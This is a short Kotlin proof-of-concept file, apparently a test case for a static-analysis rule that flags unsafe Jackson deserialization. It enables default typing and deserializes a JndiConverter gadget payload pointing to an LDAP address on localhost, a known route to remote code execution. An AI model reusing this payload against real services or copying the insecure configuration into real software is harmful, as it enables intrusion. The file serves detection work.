package com.patrilic.jackson

// ruleid:android-jackson-deserialization
import com.fasterxml.jackson.databind.ObjectMapper
import java.io.IOException

object Poc {
    @Throws(IOException::class)
    @JvmStatic
    fun main(args: Array<String>) {
        val mapper = ObjectMapper()
        mapper.enableDefaultTyping()
        val json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/ExportObject\"}]"
        mapper.readValue(json, Any::class.java)
    }
}